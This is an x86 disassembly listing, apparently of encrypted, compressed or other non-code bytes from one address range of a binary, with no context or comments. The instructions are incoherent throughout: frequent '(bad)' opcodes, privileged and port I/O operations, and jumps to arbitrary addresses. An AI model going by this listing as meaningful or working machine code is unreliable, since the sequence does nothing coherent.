  420063:	sub    esp,DWORD PTR [edi-0x8ee29b7]
  420069:	adc    DWORD PTR [ebx+esi*1+0x6b063b7b],edi
  420070:	dec    dx
  420072:	sub    BYTE PTR [edx+ecx*8+0x351f81c5],ah
  420079:	sbb    DWORD PTR [ecx-0x2],0x351bae28
  420080:	inc    ebx
  420081:	cld    
  420082:	push   es
  420083:	or     eax,0xbf54480b
  420088:	sub    dh,0xe8
  42008b:	mov    bh,BYTE PTR [edx]
  42008d:	inc    esp
  42008e:	aaa    
  42008f:	cmc    
  420090:	sub    al,0x9b
  420092:	cmc    
  420093:	idiv   DWORD PTR [bx+0x58]
  420097:	test   BYTE PTR [edi-0xe],dl
  42009a:	pop    ds
  42009b:	call   0x556208d5
  4200a0:	xor    eax,0xde3a30ff
  4200a5:	sub    cl,BYTE PTR [esi+0x51]
  4200a8:	inc    esi
  4200a9:	clc    
  4200aa:	cli    
  4200ab:	mov    al,0x4c
  4200ad:	mov    ecx,0xe32d7f38
  4200b2:	push   edi
  4200b3:	mov    ebp,0x84aac8f7
  4200b8:	pop    esi
  4200b9:	sti    
  4200ba:	push   esi
  4200bb:	mov    cl,0xd3
  4200bd:	lahf   
  4200be:	mov    eax,ds:0xc20e979
  4200c3:	ror    BYTE PTR [edx+ebx*8+0x42],0x77
  4200c8:	push   ebp
  4200c9:	fcmovbe st,st(6)
  4200cb:	fcmovnb st,st(5)
  4200cd:	sub    eax,0x2854b0cc
  4200d2:	rcr    ecx,cl
  4200d4:	scas   eax,DWORD PTR es:[edi]
  4200d5:	hlt    
  4200d6:	jl     0x420069
  4200d8:	mov    bl,0x4b
  4200da:	and    ah,BYTE PTR [eax]
  4200dc:	add    al,0xb8
  4200de:	into   
  4200df:	lds    edi,FWORD PTR [ebx]
  4200e1:	jae    0x420115
  4200e3:	pusha  
  4200e4:	inc    esi
  4200e5:	add    edi,ecx
  4200e7:	shl    esi,0xbb
  4200ea:	shl    DWORD PTR [ebx+0x5b],0xe3
  4200ee:	sbb    ch,dh
  4200f0:	inc    ebp
  4200f1:	popf   
  4200f2:	imul   esp,DWORD PTR [edi+0xdfede24],0x75
  4200f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200fb:	mov    BYTE PTR [eax-0x23],bh
  4200fe:	adc    eax,0xdb26313e
  420103:	cld    
  420104:	jge    0x4200e1
  420106:	mov    esi,ebx
  420108:	out    0xc0,al
  42010a:	icebp  
  42010b:	mov    dh,0x9
  42010d:	int    0xfb
  42010f:	jne    0x420108
  420111:	sub    BYTE PTR [esi],ah
  420113:	sahf   
  420114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420115:	fstp   TBYTE PTR [esi-0x7d4b4eac]
  42011b:	pop    ebx
  42011c:	xchg   ecx,eax
  42011d:	jae    0x42015f
  42011f:	test   eax,0xed2e6a37
  420124:	mov    ecx,0xed889f4e
  420129:	(bad)  
  42012b:	fst    DWORD PTR [ebx]
  42012d:	push   ebp
  42012e:	pushf  
  42012f:	push   ebp
  420130:	sub    al,0x3
  420132:	popa   
  420133:	fmul   st(4),st
  420135:	jae    0x42010b
  420137:	xor    DWORD PTR [ebp-0xad413e5],ebp
  42013d:	lahf   
  42013e:	jle    0x4201bd
  420140:	xlat   BYTE PTR ds:[ebx]
  420141:	out    0xc9,eax
  420143:	add    eax,0xf791b694
  420148:	mov    ebx,eax
  42014a:	hlt    
  42014b:	xor    ch,BYTE PTR [eax+edi*4]
  42014e:	lock test eax,0x37cc132
  420154:	xchg   ecx,eax
  420155:	int3   
  420156:	push   ebp
  420157:	add    DWORD PTR [ebx-0x6f],eax
  42015a:	dec    ebp
  42015b:	in     al,dx
  42015c:	fisub  WORD PTR [ebp+0x21]
  42015f:	pop    esi
  420160:	sub    ch,BYTE PTR [edi-0x59cb0ef1]
  420166:	jmp    0x2fab6325
  42016b:	inc    ebx
  42016c:	jae    0x420142
  42016e:	mov    BYTE PTR [ecx-0x7f],al
  420171:	cmp    dh,BYTE PTR [eax]
  420173:	adc    BYTE PTR [ebx+0x2947840f],bh
  420179:	cld    
  42017a:	fs retf 0xf1d2
  42017e:	push   esi
  42017f:	ror    BYTE PTR [ecx+0x37],cl
  420182:	jmp    0x4201bd
  420184:	jne    0x42012f
  420186:	retf   
  420187:	jl     0x420185
  420189:	bswap  edi
  42018b:	inc    esp
  42018c:	js     0x42012c
  42018e:	cmp    eax,0x233dd564
  420193:	mov    ds:0xf79083de,al
  420198:	gs in  al,dx
  42019a:	sub    eax,0x5211e06c
  42019f:	sbb    DWORD PTR [ebp+0x2685ac06],ecx
  4201a5:	popa   
  4201a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201a7:	sar    BYTE PTR [edx],cl
  4201a9:	jno    0x420186
  4201ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201ac:	sbb    ecx,ebx
  4201ae:	repnz popf 
  4201b0:	inc    esp
  4201b1:	retf   0xaae
  4201b4:	rcl    DWORD PTR [ecx-0xe],1
  4201b7:	push   esi
  4201b8:	mov    al,ds:0x185d03c3
  4201bd:	pop    ebp
  4201be:	mov    ds:0xcd4ccb33,al
  4201c3:	push   ebx
  4201c4:	dec    eax
  4201c5:	sbb    edi,ecx
  4201c7:	jg     0x4201ed
  4201c9:	aam    0xbf
  4201cb:	repnz xchg ecx,eax
  4201cd:	mov    edx,0x3387d058
  4201d2:	mov    edi,0xeab6ab8
  4201d7:	mov    es,WORD PTR [edi]
  4201d9:	pushf  
  4201da:	sti    
  4201db:	or     edx,ebx
  4201dd:	sub    BYTE PTR [ebx],dh
  4201df:	or     esi,esp
  4201e1:	or     DWORD PTR [edx+edx*8+0x60],edi
  4201e5:	sbb    eax,0xf356ef7c
  4201ea:	mov    ebp,DWORD PTR [ebx+0x78f2f114]
  4201f0:	xor    DWORD PTR [ebx],0xfffffffc
  4201f3:	push   ecx
  4201f4:	dec    edx
  4201f5:	(bad)  
  4201f6:	cmp    al,ah
  4201f8:	nop
  4201f9:	pop    es
  4201fa:	push   edx
  4201fb:	xchg   ecx,eax
  4201fc:	mov    ebp,0x3dbec76b
  420201:	and    BYTE PTR [esi+0x20164f92],dl
  420207:	jne    0x42020c
  420209:	xrelease mov DWORD PTR [edx],esi
  42020c:	loopne 0x420237
  42020e:	adc    dh,BYTE PTR ds:0xa5f3350d
  420214:	or     ch,al
  420216:	int3   
  420217:	fsub   DWORD PTR [edx+0x63]
  42021a:	enter  0x5b34,0x89
  42021e:	jno    0x420245
  420220:	inc    edx
  420221:	repnz push edx
  420223:	mov    eax,0x3247b521
  420228:	in     al,0x28
  42022a:	xor    al,dl
  42022c:	stc    
  42022d:	lahf   
  42022e:	pop    ds
  42022f:	jo     0x42022c
  420231:	pop    ebp
  420232:	cmp    al,0xd2
  420234:	(bad)  
  420235:	vpaddsw ymm4,ymm2,YMMWORD PTR [esi+0x7a80eec]
  42023d:	daa    
  42023e:	cmp    al,0xf3
  420240:	pushf  
  420241:	pop    eax
  420242:	(bad)  
  420243:	xchg   ebx,eax
  420244:	fsub   DWORD PTR [ecx]
  420246:	xchg   ebp,eax
  420247:	stos   DWORD PTR es:[edi],eax
  420248:	push   ds
  420249:	push   cs
  42024a:	loopne 0x42025d
  42024c:	jae    0x4202b4
  42024e:	adc    DWORD PTR [eax-0x4ed48cca],esp
  420254:	pop    ebx
  420255:	ins    DWORD PTR es:[edi],dx
  420256:	mov    WORD PTR [ebx-0x41],es
  420259:	shr    DWORD PTR [ebx],cl
  42025b:	das    
  42025c:	mov    ds:0x8b680780,al
  420261:	fs jl  0x4202d6
  420264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420265:	add    BYTE PTR [ecx-0x19c70527],bh
  42026b:	popa   
  42026c:	fistp  WORD PTR [edx+0x3b]
  42026f:	mul    al
  420271:	mov    ecx,0x92a0205c
  420276:	sbb    al,0xe3
  420278:	test   BYTE PTR [bp+di+0x4f],dh
  42027d:	jb     0x4202e6
  42027f:	mov    ebp,0x1576bcb1
  420284:	push   cs
  420285:	(bad)  
  420286:	jmp    0xf8930d9b
  42028b:	js     0x4202f0
  42028d:	je     0x4202ac
  42028f:	das    
  420290:	jmp    0x420242
  420292:	jno    0x420263
  420294:	hlt    
  420295:	xor    DWORD PTR [esi],eax
  420297:	sub    al,0xd0
  420299:	mov    esp,0x861feea5
  42029e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42029f:	pusha  
  4202a0:	fwait
  4202a1:	addr16 jnp 0x42024f
  4202a4:	leave  
  4202a5:	gs sbb BYTE PTR fs:[edi-0x1d],0x36
  4202ab:	fstp   DWORD PTR [esi+0x2c25dfaa]
  4202b1:	fwait
  4202b2:	mov    DWORD PTR [esi-0x6990def2],0x585cb790
  4202bc:	mov    ah,0xd1
  4202be:	dec    ecx
  4202bf:	loope  0x4202f6
  4202c1:	push   edx
  4202c2:	lods   al,BYTE PTR ds:[esi]
  4202c3:	adc    BYTE PTR [eax],al
  4202c5:	mov    WORD PTR ds:0xf691e038,cs
  4202cb:	call   0x7750e37e
  4202d0:	test   eax,0x3f20e56e
  4202d5:	mov    ds:0xa4ff636d,al
  4202da:	mov    ah,cl
  4202dc:	shl    ebx,cl
  4202de:	(bad)  
  4202df:	shrd   DWORD PTR [ebp+0xcdd3ec1],esp,0x96
  4202e7:	push   0x42e4c3db
  4202ec:	rcr    ecx,0xe4
  4202ef:	mov    esp,0xdaa6a861
  4202f4:	jns    0x42030f
  4202f6:	nop
  4202f7:	loopne 0x4202e2
  4202f9:	stos   BYTE PTR es:[edi],al
  4202fa:	xchg   ebx,ebp
  4202fc:	hlt    
  4202fd:	enter  0xa60e,0xfe
  420301:	addr16 mov ebx,0xcb072eb6
  420307:	sbb    al,0x56
  420309:	inc    eax
  42030a:	retf   0xc696
  42030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42030e:	dec    eax
  42030f:	jle    0x4202e6
  420311:	or     BYTE PTR [ebx-0x2fae44d6],al
  420317:	inc    eax
  420318:	mov    ch,0x1e
  42031a:	add    al,0xd7
  42031c:	adc    DWORD PTR [esi+esi*8],eax
  42031f:	cmp    esi,DWORD PTR gs:[esi-0xd]
  420323:	not    BYTE PTR [edi+ebx*1+0x5217045f]
  42032a:	fld    TBYTE PTR ds:0x11d3b30b
  420330:	test   dl,al
  420332:	leave  
  420333:	add    DWORD PTR [ebp+esi*1+0x6edaa45e],ebx
  42033a:	imul   ebx,DWORD PTR [eax-0x535fccd4],0x1d43b835
  420344:	adc    edx,DWORD PTR [ebx-0x9]
  420347:	mov    esi,0x4c66d72c
  42034c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42034d:	iret   
  42034e:	mov    WORD PTR [eax+edi*2-0x12],es
  420352:	fdivr  QWORD PTR [edx-0x4eed7421]
  420358:	xchg   ebx,eax
  420359:	cli    
  42035a:	sub    BYTE PTR [edx+0x39c17f73],0xb8
  420361:	mov    ecx,0x3b887130
  420366:	ins    DWORD PTR es:[edi],dx
  420367:	sub    dl,0x99
  42036a:	sub    DWORD PTR [ebx+eiz*4],edi
  42036d:	xchg   edi,eax
  42036e:	(bad)  
  42036f:	pop    edi
  420370:	mov    ebp,0xe6e67c28
  420375:	test   bl,bh
  420377:	loope  0x420390
  420379:	inc    edx
  42037a:	adc    DWORD PTR [edx],ecx
  42037c:	repz les ebp,FWORD PTR [edi+ecx*8]
  420380:	push   es
  420381:	retf   0xf0f
  420384:	(bad)  
  420385:	mov    esp,0xaab8c41
  42038a:	xchg   ebp,eax
  42038b:	pop    esp
  42038c:	xchg   ebx,eax
  42038d:	pop    eax
  42038e:	adc    BYTE PTR [ebp+0x4d],al
  420391:	xor    al,0x1a
  420393:	sti    
  420394:	es adc dl,0xee
  420398:	dec    edx
  420399:	inc    esp
  42039a:	or     al,0x46
  42039c:	repnz icebp 
  42039e:	lea    ebx,ds:0x72ac2999
  4203a4:	imul   eax,DWORD PTR [edi-0x4524f6b],0x3c
  4203ab:	adc    al,0x84
  4203ad:	sahf   
  4203ae:	jecxz  0x420338
  4203b0:	inc    ebp
  4203b1:	sti    
  4203b2:	stos   BYTE PTR es:[edi],al
  4203b3:	mov    eax,ds:0x912b16a4
  4203b8:	or     al,0xce
  4203ba:	imul   ebp,DWORD PTR [edx],0x5f
  4203bd:	inc    edx
  4203be:	and    al,0x8a
  4203c0:	inc    edi
  4203c1:	mov    eax,ds:0x12f44fa9
  4203c6:	sub    edx,DWORD PTR fs:[eax]
  4203c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203ca:	jmp    0x2071:0x6c230fe9
  4203d1:	data16 mov ah,0xc9
  4203d4:	and    al,0xdd
  4203d6:	clc    
  4203d7:	pop    ds
  4203d8:	cs xchg ecx,eax
  4203da:	daa    
  4203db:	hlt    
  4203dc:	call   0x86:0xba49666a
  4203e3:	push   ebx
  4203e4:	xlat   BYTE PTR ds:[ebx]
  4203e5:	xchg   BYTE PTR [ebx],ah
  4203e7:	popa   
  4203e8:	push   ds
  4203e9:	dec    esp
  4203ea:	and    al,0x44
  4203ec:	(bad)  
  4203ed:	mov    esi,0x3453a051
  4203f2:	or     al,0x80
  4203f4:	in     eax,dx
  4203f5:	fnstsw WORD PTR [edx]
  4203f7:	mov    dl,0x2c
  4203f9:	push   ebx
  4203fa:	sub    DWORD PTR [ebx+ecx*1],0x5702084f
  420401:	jne    0x42046a
  420403:	inc    esp
  420404:	loop   0x42041d
  420406:	push   0xffffff9d
  420408:	lods   eax,DWORD PTR es:[esi]
  42040a:	inc    ebp
  42040b:	sbb    eax,0x9c4b2e98
  420410:	je     0x42045d
  420412:	pop    ecx
  420413:	mov    dl,0x8a
  420415:	das    
  420416:	repnz mov bh,BYTE PTR [ebx]
  420419:	gs fs pop eax
  42041c:	int3   
  42041d:	jnp    0x420409
  42041f:	fnstenv [edi]
  420421:	in     al,dx
  420422:	lods   eax,DWORD PTR ds:[esi]
  420423:	jecxz  0x4203cb
  420425:	js     0x42044a
  420427:	outs   dx,BYTE PTR ds:[esi]
  420429:	push   ebp
  42042a:	sbb    BYTE PTR [esi],bh
  42042c:	fcomp  QWORD PTR [edx+0x29]
  42042f:	add    DWORD PTR [esi+0x144a0bfd],ecx
  420435:	fs jnp 0x42046e
  420438:	or     bh,0xac
  42043b:	jecxz  0x4203dc
  42043d:	(bad)  
  42043e:	(bad)  
  42043f:	and    edx,DWORD PTR [ebp+0x69]
  420442:	mov    ch,0x57
  420444:	mov    ebp,esi
  420446:	push   eax
  420447:	pop    ebp
  420448:	pop    ds
  420449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42044a:	mov    ?,eax
  42044c:	das    
  42044d:	mov    esi,0x5594af07
  420452:	inc    edx
  420453:	mov    ecx,ecx
  420455:	pop    ss
  420456:	rcl    DWORD PTR [eax+eiz*8-0x50],0x9
  42045b:	fsubr  QWORD PTR [bp+si-0x79d2]
  420461:	sub    al,0xfc
  420463:	xchg   esi,eax
  420464:	out    dx,eax
  420465:	adc    ecx,DWORD PTR [esi-0x29]
  420468:	xlat   BYTE PTR ds:[ebx]
  420469:	cmc    
  42046a:	push   es
  42046b:	xor    ah,BYTE PTR [ecx]
  42046d:	lods   eax,DWORD PTR ds:[esi]
  42046e:	add    esi,DWORD PTR [eax+0x7f]
  420471:	std    
  420472:	sti    
  420473:	inc    esi
  420474:	xchg   ecx,eax
  420475:	sub    DWORD PTR [ecx+edi*1],esp
  420478:	clc    
  420479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42047a:	fwait
  42047b:	or     BYTE PTR [ebp+0x42d8ef35],0x63
  420482:	loopne 0x420501
  420484:	ret    0xd5e1
  420487:	enter  0xca59,0x75
  42048b:	rcl    BYTE PTR [eax+esi*1-0xf],cl
  42048f:	push   eax
  420490:	test   BYTE PTR [ecx],dl
  420492:	scas   al,BYTE PTR es:[edi]
  420493:	in     eax,dx
  420494:	xor    cl,BYTE PTR [eax-0x7c]
  420497:	xor    bh,BYTE PTR [ebp+0x61]
  42049a:	in     al,0x5f
  42049c:	dec    ecx
  42049d:	inc    edi
  42049e:	inc    edi
  42049f:	dec    ebx
  4204a0:	out    dx,al
  4204a1:	jbe    0x4204c0
  4204a3:	pop    ecx
  4204a4:	cmp    BYTE PTR [ebp+0x70327434],0xec
  4204ab:	leave  
  4204ac:	xchg   BYTE PTR [edi+0x65253112],ch
  4204b2:	or     DWORD PTR [ebx+eax*4-0x9],edx
  4204b6:	xor    ah,BYTE PTR [ebx-0x26]
  4204b9:	popa   
  4204ba:	adc    DWORD PTR [esi-0x1efd02d8],eax
  4204c0:	enter  0xa2be,0x2c
  4204c4:	in     eax,0x5f
  4204c6:	stc    
  4204c7:	jmp    0x420456
  4204c9:	jne    0x420454
  4204cb:	xor    BYTE PTR [eax+0x31],ch
  4204ce:	jno    0x42050c
  4204d0:	jo     0x4204d6
  4204d2:	jge    0x420473
  4204d4:	jo     0x420472
  4204d6:	pusha  
  4204d7:	or     al,0xea
  4204d9:	pop    esp
  4204da:	xor    ecx,eax
  4204dc:	in     al,dx
  4204dd:	nop
  4204de:	adc    ecx,DWORD PTR [ebx]
  4204e0:	sahf   
  4204e1:	and    ebp,DWORD PTR [eax+0x4ffe2cf8]
  4204e7:	popa   
  4204e8:	ja     0x42051c
  4204ea:	daa    
  4204eb:	adc    ebp,edi
  4204ed:	jb     0x420523
  4204ef:	daa    
  4204f0:	jmp    0xa270:0xc8efcfc6
  4204f7:	addr16 aam 0xfd
  4204fa:	jbe    0x4204a5
  4204fc:	xor    BYTE PTR [eax+esi*1-0xb],0x71
  420501:	out    dx,al
  420502:	jecxz  0x420544
  420504:	xor    BYTE PTR [edi+0x50],al
  420507:	dec    eax
  420508:	je     0x4204f1
  42050a:	mov    eax,esi
  42050c:	std    
  42050d:	fild   DWORD PTR [ebx]
  42050f:	test   edx,edx
  420511:	fild   DWORD PTR [ebp+eiz*1+0x48]
  420515:	scas   eax,DWORD PTR es:[edi]
  420516:	dec    eax
  420517:	mov    ds:0xf5132d5f,al
  42051c:	jmp    0x7c30abcc
  420521:	dec    ebp
  420522:	fs mov esp,0x65e5405
  420528:	sbb    al,bl
  42052a:	jne    0x420555
  42052c:	out    dx,eax
  42052d:	arpl   ax,bx
  42052f:	ins    BYTE PTR es:[edi],dx
  420530:	hlt    
  420531:	mov    ebp,DWORD PTR [edi-0x32c85e41]
  420537:	jmp    0x1f4e:0xe4e7eb51
  42053e:	pop    ecx
  42053f:	sbb    eax,0x41eace2d
  420544:	lock xchg edx,eax
  420546:	dec    eax
  420547:	loope  0x4204ca
  420549:	pop    ss
  42054a:	mov    edx,0xeb6a1a5b
  42054f:	or     ecx,DWORD PTR [edx+esi*4-0x32]
  420553:	pop    eax
  420554:	retf   
  420555:	fisttp DWORD PTR ds:0x645cdab4
  42055b:	repnz adc eax,0x8cf726ec
  420561:	icebp  
  420562:	or     bl,BYTE PTR [eax+0x1d180cab]
  420568:	in     eax,0x11
  42056a:	adc    al,0x4b
  42056c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42056d:	pop    eax
  42056e:	stos   BYTE PTR es:[edi],al
  42056f:	cwde   
  420570:	sbb    eax,0x388ab0c7
  420575:	fcmovnbe st,st(4)
  420577:	add    DWORD PTR [edi+0x6],0xf120054b
  42057e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42057f:	clc    
  420580:	xor    al,0xa7
  420582:	scas   al,BYTE PTR es:[edi]
  420583:	push   0xffffff86
  420585:	push   esp
  420586:	and    DWORD PTR [eax+edx*2],ebp
  420589:	ror    DWORD PTR [ebp-0x52010001],0x9c
  420590:	inc    esi
  420591:	(bad)  
  420592:	retf   
  420593:	inc    ecx
  420594:	lods   al,BYTE PTR ds:[esi]
  420595:	cwde   
  420596:	and    DWORD PTR [esi],edx
  420598:	loop   0x42060f
  42059a:	lods   eax,DWORD PTR ds:[esi]
  42059b:	imul   eax,DWORD PTR [ebp+0x6e],0x724f761
  4205a2:	jns    0x4205c2
  4205a4:	or     BYTE PTR [ebp+0x7d7f50f0],ah
  4205aa:	mov    al,ds:0xa0a7961f
  4205af:	loopne 0x420564
  4205b1:	cld    
  4205b2:	inc    DWORD PTR [edi]
  4205b4:	call   0x1578:0xefe3e3bf
  4205bb:	test   al,0xb0
  4205bd:	std    
  4205be:	pop    ecx
  4205bf:	loope  0x420607
  4205c1:	scas   eax,DWORD PTR es:[edi]
  4205c2:	xchg   ecx,eax
  4205c3:	mov    ecx,0x69145c3b
  4205c8:	sti    
  4205c9:	xor    esp,DWORD PTR [edx]
  4205cb:	xchg   ebp,eax
  4205cc:	int    0x39
  4205ce:	sub    al,0xec
  4205d0:	inc    eax
  4205d1:	xor    DWORD PTR [ebx],ebp
  4205d3:	popf   
  4205d4:	xchg   ecx,eax
  4205d5:	fld    st(0)
  4205d7:	jmp    0x420636
  4205d9:	(bad)  
  4205db:	mov    ah,0x63
  4205dd:	scas   eax,DWORD PTR es:[edi]
  4205de:	cmp    DWORD PTR [ebp+0x7eb08099],esp
  4205e4:	xchg   ecx,eax
  4205e5:	imul   ecx,DWORD PTR [edx-0x3480f7a1],0xffffffc2
  4205ec:	jle    0x420668
  4205ee:	gs dec eax
  4205f0:	addr16 mov ch,0xeb
  4205f3:	hlt    
  4205f4:	and    al,0x8b
  4205f6:	xchg   ebx,eax
  4205f7:	lods   eax,DWORD PTR ds:[esi]
  4205f8:	push   ecx
  4205f9:	pusha  
  4205fa:	push   0x3b
  4205fc:	jmp    0xc9a01be9
  420601:	es (bad) 
  420604:	pop    ds
  420605:	lea    ebp,[eax+0x21c6a07]
  42060b:	cmp    DWORD PTR ss:[ecx-0x45],ebp
  42060f:	ja     0x420641
  420611:	(bad)  
  420612:	pushf  
  420613:	or     ch,BYTE PTR [esi]
  420615:	pop    es
  420616:	and    ch,BYTE PTR [edi]
  420618:	xor    dl,BYTE PTR [edx-0x55]
  42061b:	in     eax,dx
  42061c:	pop    edx
  42061d:	adc    ah,BYTE PTR [ebp+0x64]
  420620:	std    
  420621:	into   
  420622:	sbb    dh,BYTE PTR [eax-0x72]
  420625:	fidiv  DWORD PTR [esi*8+0x558d0bf6]
  42062c:	std    
  42062d:	xchg   DWORD PTR [ecx-0x3b68655b],eax
  420633:	inc    edi
  420634:	in     eax,0x66
  420636:	loopne 0x4205b9
  420638:	xlat   BYTE PTR ds:[ebx]
  420639:	mov    eax,ds:0xe6ebc77a
  42063e:	dec    esp
  42063f:	int3   
  420640:	jge    0x420620
  420642:	adc    eax,0xbe65ae9a
  420647:	sti    
  420648:	mov    dh,0x2d
  42064a:	(bad)  
  42064b:	mov    dl,0xd2
  42064d:	fisttp QWORD PTR [edx+eax*1+0x56]
  420651:	sar    eax,0xd8
  420654:	outs   dx,DWORD PTR ds:[esi]
  420655:	and    eax,0x14defbc6
  42065a:	push   es
  42065b:	mov    ecx,DWORD PTR [edi-0x67]
  42065e:	out    dx,eax
  42065f:	mov    ?,WORD PTR [edx+0x5d1559ec]
  420665:	popf   
  420666:	xor    cl,BYTE PTR [edx]
  420668:	inc    ecx
  420669:	and    DWORD PTR [ebp+0x366a1aac],esp
  42066f:	rcl    BYTE PTR [edi+eiz*4+0x6d],1
  420673:	xchg   ecx,eax
  420674:	ror    DWORD PTR [eax-0x46c31e4d],1
  42067a:	out    0x1a,al
  42067c:	lock or dl,0xba
  420680:	fild   QWORD PTR [ebp+ecx*4-0x80]
  420684:	push   0x54
  420686:	sub    edi,DWORD PTR [ebx+0x66d9b8eb]
  42068c:	imul   edi,DWORD PTR [eax],0xffffffab
  42068f:	(bad)  
  420690:	and    ecx,esi
  420692:	inc    edi
  420693:	mov    DWORD PTR ds:0x3b8b3c23,ebp
  420699:	test   al,0x16
  42069b:	scas   eax,DWORD PTR es:[edi]
  42069c:	daa    
  42069d:	(bad)  
  42069e:	fild   WORD PTR [ecx]
  4206a0:	lods   eax,DWORD PTR ds:[esi]
  4206a1:	push   ebx
  4206a2:	and    DWORD PTR [ecx+ebx*1+0x49],esi
  4206a6:	mov    edx,0xdd0b7722
  4206ab:	jmp    FWORD PTR [ebx]
  4206ad:	(bad)  
  4206ae:	in     eax,dx
  4206af:	leave  
  4206b0:	inc    al
  4206b2:	sbb    ebp,DWORD PTR [edx-0x25]
  4206b5:	cmp    BYTE PTR [ebx],cl
  4206b7:	pop    eax
  4206b8:	pop    eax
  4206b9:	jecxz  0x420672
  4206bb:	sbb    eax,0x800c5e4
  4206c0:	sub    ebp,ecx
  4206c2:	sar    DWORD PTR [edx*8-0x6e553d23],1
  4206c9:	jle    0x42067b
  4206cb:	sub    cl,BYTE PTR [eax+0x2]
  4206ce:	dec    DWORD PTR [ecx-0x48aa9247]
  4206d4:	and    edi,DWORD PTR [edi]
  4206d6:	dec    ecx
  4206d7:	cdq    
  4206d8:	pop    DWORD PTR [eax]
  4206da:	and    al,0x5
  4206dc:	sti    
  4206dd:	scas   al,BYTE PTR es:[edi]
  4206de:	inc    ebx
  4206df:	jmp    0x420754
  4206e1:	in     al,0xbe
  4206e3:	jno    0x4206f3
  4206e5:	loopne 0x420733
  4206e7:	call   0x1324:0x744bf393
  4206ee:	xchg   DWORD PTR [ecx-0x1b],eax
  4206f1:	xchg   al,al
  4206f3:	jg     0x4206af
  4206f5:	fild   QWORD PTR [esi-0x1bd90353]
  4206fb:	cmp    DWORD PTR [edx+ecx*2-0x15074534],ebp
  420702:	xor    ch,BYTE PTR [ebp-0x7d]
  420705:	mov    gs,WORD PTR [ecx-0x3594823a]
  42070b:	xchg   ebp,eax
  42070c:	imul   esp,DWORD PTR [ebx],0xfc6481a
  420712:	push   eax
  420713:	adc    ecx,DWORD PTR [ebp-0x15]
  420716:	inc    eax
  420717:	push   esp
  420718:	cmp    al,0x41
  42071a:	hlt    
  42071b:	mov    eax,0xe2ebf649
  420720:	cmp    edi,0x1c
  420723:	adc    bl,bl
  420725:	rcr    dl,0x1
  420728:	pop    esi
  420729:	lods   eax,DWORD PTR ds:[esi]
  42072a:	push   ss
  42072b:	stos   DWORD PTR es:[edi],eax
  42072c:	jg     0x420791
  42072e:	pop    edi
  42072f:	test   DWORD PTR [ecx-0x737f97bf],ebp
  420735:	es inc esp
  420737:	stos   DWORD PTR es:[edi],eax
  420738:	and    esi,DWORD PTR [esi+0x245a26d3]
  42073e:	cmp    eax,ecx
  420740:	fbld   TBYTE PTR [edi+0x9]
  420743:	cmp    al,0xcf
  420745:	push   eax
  420746:	or     al,0xdc
  420748:	gs jne 0x4206dc
  42074b:	scas   eax,DWORD PTR es:[edi]
  42074c:	xlat   BYTE PTR ds:[ebx]
  42074d:	fstp   DWORD PTR [edx]
  42074f:	aam    0xa3
  420751:	sub    ecx,DWORD PTR [esi+0xb7dd238]
  420757:	pushf  
  420758:	mov    bh,0x19
  42075a:	ja     0x4207b4
  42075c:	dec    edi
  42075d:	in     eax,0x9c
  42075f:	stc    
  420760:	jno    0x420770
  420762:	test   BYTE PTR [edx-0x66f7c7cf],dh
  420768:	ins    BYTE PTR es:[edi],dx
  420769:	or     bh,BYTE PTR [edi+edx*4]
  42076c:	and    cl,ah
  42076e:	fimul  WORD PTR [edx]
  420770:	sub    DWORD PTR [ebx-0x7c8ea895],ebx
  420776:	jae    0x4207c2
  420778:	jno    0x420712
  42077a:	cmp    ch,ch
  42077c:	mov    ds:0xe7243cff,al
  420781:	push   ecx
  420782:	xlat   BYTE PTR ds:[ebx]
  420783:	mov    DWORD PTR [esi],edi
  420785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420786:	fistp  WORD PTR [edx-0x1f5ef455]
  42078c:	jmp    0xa0d63e10
  420791:	fdiv   DWORD PTR [edi]
  420793:	iret   
  420794:	cmc    
  420795:	cmp    DWORD PTR [ebp-0x669b11d2],edi
  42079b:	add    ch,BYTE PTR [edi]
  42079d:	dec    esi
  42079e:	cli    
  42079f:	mov    cl,0x41
  4207a1:	bound  esi,QWORD PTR [edi-0x25]
  4207a4:	das    
  4207a5:	cmp    al,BYTE PTR [eax+0x5a]
  4207a8:	xor    DWORD PTR [ebp-0x51],eax
  4207ab:	cwde   
  4207ac:	cmp    BYTE PTR [ecx-0x50],ch
  4207af:	or     eax,0xe6eb8666
  4207b4:	in     al,0x32
  4207b6:	in     eax,0xf4
  4207b8:	es out dx,al
  4207ba:	add    eax,0xa96af23b
  4207bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207c1:	push   eax
  4207c2:	popa   
  4207c3:	xchg   ecx,eax
  4207c4:	hlt    
  4207c5:	dec    edx
  4207c6:	inc    esp
  4207c7:	lods   al,BYTE PTR ds:[esi]
  4207c8:	loop   0x42076e
  4207ca:	cdq    
  4207cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207cc:	jae    0x420809
  4207ce:	sbb    ebp,DWORD PTR [esi+0x13]
  4207d1:	cli    
  4207d2:	loop   0x42077e
  4207d4:	arpl   WORD PTR [ebx-0x3f],si
  4207d7:	aam    0x4
  4207d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207db:	call   0xdbd3:0x930990f8
  4207e2:	and    dl,BYTE PTR [eax-0x2b]
  4207e5:	cmp    bl,bh
  4207e7:	imul   BYTE PTR [ecx-0x758cb702]
  4207ed:	and    eax,0xc1618b4
  4207f2:	add    bh,0x13
  4207f5:	sbb    ebp,DWORD PTR [eax+0x699d251b]
